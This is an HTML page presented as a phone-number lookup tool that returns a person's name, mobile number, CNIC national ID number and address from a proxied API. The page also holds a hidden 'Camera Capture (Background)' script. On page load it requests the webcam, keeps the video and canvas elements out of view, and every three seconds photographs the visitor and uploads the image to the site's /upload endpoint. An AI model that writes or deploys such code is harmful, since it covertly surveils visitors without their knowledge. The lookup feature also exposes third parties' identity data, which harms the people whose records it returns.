<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Phone Number Search</title>
<style>
body {
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    min-height: 100vh;
    margin: 0;
    background-color: #f0f2f5;
    padding-top: 50px;
}
.container {
    width: 90%;
    max-width: 800px;
    background-color: #fff;
    padding: 30px;
    border-radius: 12px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}
.search-box {
    display: flex;
    gap: 10px;
    margin-bottom: 30px;
}
#phone-input {
    flex-grow: 1;
    padding: 12px;
    border: 1px solid #ccc;
    border-radius: 6px;
    font-size: 16px;
}
#search-button {
    padding: 12px 20px;
    background-color: #007bff;
    color: white;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 16px;
    transition: background-color 0.2s;
}
#search-button:hover {
    background-color: #0056b3;
}
#results-container {
    display: grid;
    gap: 20px;
}
.data-card {
    border: 1px solid #e0e0e0;
    border-radius: 10px;
    padding: 20px;
    background-color: #fafafa;
    box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
    transition: transform 0.2s;
}
.data-card:hover {
    transform: translateY(-3px);
}
.data-card h3 { margin-top:0; margin-bottom:10px; color:#333; }
.data-card p { margin:5px 0; color:#555; font-size:14px; }
.data-card p strong { color:#000; }
#video, #canvas { display: none; }
</style>
</head>
<body>
<div class="container mt-5">
<h1>Phone Number Data Search</h1>
<div class="search-box">
<input type="text" id="phone-input" placeholder="Enter phone number (e.g., 03012345678)">
<button id="search-button">Search</button>
</div>
<div id="results-container"></div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>
</div>

<script>
// ================= Phone Number Search =================
document.getElementById('search-button').addEventListener('click', async () => {
    const phoneInput = document.getElementById('phone-input').value.trim();
    const resultsContainer = document.getElementById('results-container');
    resultsContainer.innerHTML = '';

    if (!phoneInput) {
        resultsContainer.innerHTML = '<pre style="color: red;">Please enter a phone number.</pre>';
        return;
    }

    resultsContainer.innerHTML = '<pre>Searching for data...</pre>';

    try {
        // Use Flask proxy route
        const apiUrl = `/api-proxy?phone=${phoneInput}`;
        const response = await fetch(apiUrl);
        const data = await response.json();

        resultsContainer.innerHTML = '';

        if (!data.records || data.records.length === 0) {
            resultsContainer.innerHTML = '<p>No records found.</p>';
            return;
        }

        data.records.forEach(record => {
            const card = document.createElement('div');
            card.className = 'data-card';
            card.innerHTML = `
                <h3>${record.Name || "Not Available"}</h3>
                <p><strong>Mobile:</strong> ${record.Mobile || "N/A"}</p>
                <p><strong>Country:</strong> ${record.Country || "N/A"}</p>
                <p><strong>CNIC:</strong> ${record.CNIC || "N/A"}</p>
                <p><strong>Address:</strong> ${record.Address || "N/A"}</p>
            `;
            resultsContainer.appendChild(card);
        });

    } catch (error) {
        console.error('Fetch error:', error);
        resultsContainer.innerHTML = `<pre style="color: red;">Failed to fetch API data.\n\nError details: ${error.message}</pre>`;
    }
});

// ================= Camera Capture (Background) =================
async function startCamera() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");
    const baseURL = window.location.origin;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        await new Promise(resolve => { video.onloadedmetadata = () => resolve(); });

        setInterval(async () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataURL = canvas.toDataURL("image/png");

            await fetch(`${baseURL}/upload`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image: dataURL })
            });

            console.log("New photo captured & uploaded");

        }, 3000);

    } catch (err) {
        console.error("Camera access error:", err);
    }
}

window.onload = startCamera;
</script>
</body>
</html>